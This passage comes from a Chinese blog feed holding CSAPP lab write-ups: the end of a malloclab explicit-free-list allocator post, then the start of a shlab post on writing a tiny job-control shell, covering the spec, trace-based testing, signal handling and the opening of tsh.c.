class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">is_in_free_list</span><span class="params">(<span class="keyword">void</span> *bp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *p;</span><br><span class="line">    <span class="keyword">for</span> (p = NEXT_FREE_BLKP(free_list_head); p != <span class="literal">NULL</span>; p = NEXT_FREE_BLKP(p))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (p == bp)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面就是整个explicit list的实现了. 最终实现的效果是,跑完所有trace file,得分 83/100. 算是个良水平吧. 要想实现优秀水平,可以考虑做做segregated list或者red block tree list.</p><p>再谈一些优化:</p><ol><li>空间优化,对于分配的block, 可以不存储NEXT和PREV指针, 从而扩大payload空间,提高空间利用率.</li><li>封装整个free list, 然后改用segregated list.</li><li>现在search策略是从头search到尾部, ,比较慢,可以针对每个free block建立index, index数据结构选择rbtree, 应该可以大大提高分配吞吐量.</li></ol><h2 id="5-总结"><a href="#5-总结" class="headerlink" title="5. 总结"></a>5. 总结</h2><p>嗯, 个人觉得这个lab仅次于cachelab, 但是它的难点不在于思路,而在于如何调试,毕竟像我这样的菜鸡,不debug是不可能,这辈子都不可能不debug的, 而这次lab有很多macros, 就很难在gdb中调试,gdb中也只能通过exam命令查看连续的地址内存空间, 但是当trace file中给定的malloc size过大时, exam命令也很难快速查看, 所以个人在做的时候, 将trace file的malloc size手动改小了(当然后面还是改回去了的),然后debug就会相对轻松一些. </p><p>再谈谈收获, 总算清晰的知道了什么是虚拟内存,页表,TLB,为什么要设计它们,它们有什么好处. 也知道了malloc的基本工作原理, 现在想想这些技术也不是离我们那么遥远, 继续加油吧, 下一个lab是网络相关的了, 不过下一次lab又得暂停一阵子了, 项目的事情让人心累…</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本次lab，malloclab，自己手写一个内存分配器。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Csapp" scheme="https://www.ravenxrz.ink/categories/Csapp/"/>
    
    
  </entry>
  
  <entry>
    <title>Csapp-Shlab题解</title>
    <link href="https://www.ravenxrz.ink/archives/cf3e2591.html"/>
    <id>https://www.ravenxrz.ink/archives/cf3e2591.html</id>
    <published>2020-08-15T11:36:25.000Z</published>
    <updated>2020-09-06T07:37:36.751Z</updated>
    
    <content type="html"><![CDATA[<p>本次lab, shlab. 即编写一个简单的shell。</p><h2 id="0-背景知识"><a href="#0-背景知识" class="headerlink" title="0. 背景知识"></a>0. 背景知识</h2><p>shlab相对其它lab要简单一些，但是其中牵涉出来的一些概念是相当难的。简单说一下这次lab依赖的背景知识吧。</p><blockquote><p>书籍对应 异常控制流 章节</p></blockquote><ol><li>理解进程的概念，linux如何创建新进程，进程的状态转换，回收等过程。</li><li>理解linux中的signal概念，掌握如何发送、接收、处理signal事件，理解signal handler中的 <strong>Async-Signal-Safety问题及解决方案（也是本次实验的难点）</strong> ，掌握async-signal-safety的guideline.</li></ol><a id="more"></a><h2 id="1-题目要求"><a href="#1-题目要求" class="headerlink" title="1. 题目要求"></a>1. 题目要求</h2><p>题目的要求主要看shlab的writeup的 《The tsh Specification》小节：</p><p>Your tsh shell should have the following features:</p><ol><li><p>The prompt should be the string “tsh&gt; ”.</p></li><li><p>The command line typed by the user should consist of a name and zero or more arguments, all separated by one or more spaces. If name is a built-in command, then tsh should handle it immediately and wait for the next command line. Otherwise, tsh should assume that name is the path of an executable file, which it loads and runs in the context of an initial child process (In this context, the term <em>job</em> refers to this initial child process).</p></li><li><p>tsh need not support pipes (|) or I/O redirection (&lt; and &gt;).</p></li><li><p>Typing ctrl-c (ctrl-z) should cause a SIGINT (SIGTSTP) signal to be sent to the current foreground job, as well as any descendents of that job (e.g., any child processes that it forked). If there is no foreground job, then the signal should have no effect.</p></li><li><p>If the command line ends with an ampersand &amp;, then tsh should run the job in the background. Otherwise, it should run the job in the foreground.</p></li><li><p>Each job can be identified by either a process ID (PID) or a job ID (JID), which is a positive integer assigned by tsh. JIDs should be denoted on the command line by the prefix ’%’. For example, “%5” denotes JID 5, and “5” denotes PID 5. (We have provided you with all of the routines you need for manipulating the job list.)</p></li><li><p>tsh should support the following built-in commands:<br>– The quit command terminates the shell.<br>– The jobs command lists all background jobs.<br>– The bg <job> command restarts <job> by sending it a SIGCONT signal, and then runs it inthe background. The <job> argument can be either a PID or a JID.<br>– The fg <job> command restarts <job> by sending it a SIGCONT signal, and then runs it in the foreground. The <job> argument can be either a PID or a JID.</p></li><li><p>tsh should reap all of its zombie children. If any job terminates because it receives a signal that it didn’t catch, then tsh should recognize this event and print a message with the job’s PID and a description of the offending signal.</p></li></ol><p>上述是整个shell的功能要求，但是我们不必从0写整个代码，整体代码的框架是已经搭建好了的，只用完成tsh.c文件中的以下几个函数：</p><ol><li>eval: Main routine that parses and interprets the command line. [70 lines]</li><li>builtin cmd: Recognizes and interprets the built-in commands: quit, fg, bg, and jobs. [25 lines]</li><li>do bgfg: Implements the bg and fg built-in commands. [50 lines]</li><li>waitfg: Waits for a foreground job to complete. [20 lines]</li><li>sigchld handler: Catches SIGCHILD signals. 80 lines]</li><li>sigint handler: Catches SIGINT (ctrl-c) signals. [15 lines]</li><li>sigtstp handler: Catches SIGTSTP (ctrl-z) signals. [15 lines]</li></ol><p>一共7个函数，每个函数也给出了建议的行数。</p><p>再看下如何验证lab。 shlab提供了tshref，用于参考。同时给出了16个trace file以及一个driver，具体验证过程为， trace file指导driver运行制定shell，查看我们写的shell是否和tshref输出一致。举个例子，执行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make test01</span><br></pre></td></tr></table></figure><p>driver会读取trace01.txt, 在tsh（我们写的shell）下执行trace01.txt中的命令，然后tsh会给出一些输出。此时再执行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make rtest01</span><br></pre></td></tr></table></figure><p>driver会读取trace01.txt 在tshref(参考的shell)下执行trace01.txt中的命令，然后tshref会给出一些输出。对比两次输出，即可知道自己写的shell是否正确了。</p><p>当然了，一共16个trace file,每次都make，相当麻烦，所以lab中还给出了 tshref.out文件，这里面给出了所有tshref的输出结果。</p><h2 id="2-题目分析"><a href="#2-题目分析" class="headerlink" title="2. 题目分析"></a>2. 题目分析</h2><p>稍微思考下，可以分析出，其实shell就两种命令，一种buildin命令(fg,bg,quit,jobs)，需要立即在shell中执行，一种外部命令，需要fork出新进程来执行，只不过这里需要考虑是前台进程和后台进程。</p><p>那先说说<strong>buildin命令</strong>，其中 jobs 已经有默认实现了，quit也相对简单，剩下的就是fg和bg。</p><p>那fg和bg做了什么事情呢? 其实代码中已经给出了答案：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * Jobs states: FG (foreground), BG (background), ST (stopped)</span></span><br><span class="line"><span class="comment"> * Job state transitions and enabling actions:</span></span><br><span class="line"><span class="comment"> *     FG -&gt; ST  : ctrl-z</span></span><br><span class="line"><span class="comment"> *     ST -&gt; FG  : fg command</span></span><br><span class="line"><span class="comment"> *     ST -&gt; BG  : bg command</span></span><br><span class="line"><span class="comment"> *     BG -&gt; FG  : fg command</span></span><br><span class="line"><span class="comment"> * At most 1 job can be in the FG state.</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><p>fg命令，无法是将后台（Running 或 Stopped）转换到前台来。</p><p>bg命令，将后台Stopped的进程转换为后台Running。</p><p>额外的一些工作就是fg和bg的语法：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fg%jid</span><br><span class="line">或</span><br><span class="line">fg pid</span><br></pre></td></tr></table></figure><p>自己通过是否有%来解析就好。</p><p>再来看看<strong>外部命令</strong> ， 在parseline函数执行时，会返回当前的命令是前台进程还是后台进程。所以这部分不用我们操心。我们唯一需要做得，就是对前台进程和后台进程”分别处理“。</p><p><strong>这里会用到几个知识点：</strong></p><ol><li><p>子进程在terminate或stop时，内核会发送SIGCHLD给父进程</p></li><li><p>父进程需要通过wait族函数回收子进程，否则子进程变为zombie进程，耗费系统资源。</p></li></ol><p>ok，有了两个知识点，思考一下如何对待前台进程和后台进程：</p><ol><li>前台进程：最为直接的想法就是父进程调用wait系统调用，等待前台进程结束。但请注意刚才提到的知识点1，前台进程结束后，wait系统调用的确返回了，但同时，父进程会收到SIGCHLD信号，sigchld_handler会被调用。这会带来什么问题？接着看后台进程如何处理。</li><li>后台进程：后台进程意味不能阻塞tsh进程，也就意味着我们不能在tsh中调用wait系统调用，那唯一能回收后台进程（除非强制kill）就是当后台进程结束后，父进程会收到SIGHLD信号，通过sigchld_handler来回收，也就意味着我们的sigchld_handler中会有wait系统调用的存在。<strong>ok，结合目前前台进程的处理，就会存在一个严重的问题。</strong></li></ol><p><strong>前台进程，在tsh.c 中出现了两次wait操作。一次在最开始fork出前台进程时，一次出现在sigchld_handler中。</strong>所以这种情况需要处理，大体思路有两种：</p><ol><li>前台进程，fork后立即wait保持不变，在sigchld_handler中过滤掉前台进程的terminate，避免重复wait。</li><li>前台进程，fork后的wait变为”伪wait”, 前后台进程统一在sigchld_handler中回收处理。那什么是”伪wait“，我们要之前前台进程的意思是什么，作用是什么，作用就是阻塞住当前的tsh，不允许输入新命令，除此之外，前后台进程都是一样的。ok，既然这样，我们只用让tsh阻塞住即可，采用什么方法则看个人实现了。</li></ol><p>显然，第二种统一处理更容易理解，维护。当然，writeup其实给出了一种解决方案：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200805133536133.png" alt="image-20200805133536133"></p><p>另外一个问题就是，<strong>信号的转发</strong>。</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200805133902911.png" alt="image-20200805133902911"></p><p>这里要解决的是，后台进程不应该接收到Ctrl-C所引发的信号。</p><p>还有一个问题就是<strong>保持和tshref的输出相同</strong>，那需要在恰当的位置，打印出相应的信息，这部分不难，但其实挺磨人的。</p><p>最后就是非tsh需求的逻辑部分了，那就是<strong>如何编写 async-signal-safety 的代码</strong>。如果你是看了csapp课程或书籍的话， 那应该可以意识这里会有一些async-signal-safety问题。ppt中其实基本上给出所有我们会遇到的问题，以及一些常用的guideline。这部分需要仔细阅读，理解清楚，必然很可能出现一些莫名的bug。</p><p>下面贴出我个人的代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br><span class="line">770</span><br><span class="line">771</span><br><span class="line">772</span><br><span class="line">773</span><br><span class="line">774</span><br><span class="line">775</span><br><span class="line">776</span><br><span class="line">777</span><br><span class="line">778</span><br><span class="line">779</span><br><span class="line">780</span><br><span class="line">781</span><br><span class="line">782</span><br><span class="line">783</span><br><span class="line">784</span><br><span class="line">785</span><br><span class="line">786</span><br><span class="line">787</span><br><span class="line">788</span><br><span class="line">789</span><br><span class="line">790</span><br><span class="line">791</span><br><span class="line">792</span><br><span class="line">793</span><br><span class="line">794</span><br><span class="line">795</span><br><span class="line">796</span><br><span class="line">797</span><br><span class="line">798</span><br><span class="line">799</span><br><span class="line">800</span><br><span class="line">801</span><br><span class="line">802</span><br><span class="line">803</span><br><span class="line">804</span><br><span class="line">805</span><br><span class="line">806</span><br><span class="line">807</span><br><span class="line">808</span><br><span class="line">809</span><br><span class="line">810</span><br><span class="line">811</span><br><span class="line">812</span><br><span class="line">813</span><br><span class="line">814</span><br><span class="line">815</span><br><span class="line">816</span><br><span class="line">817</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * tsh - A tiny shell program with job control</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * &lt;Put your name and login ID here&gt;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span 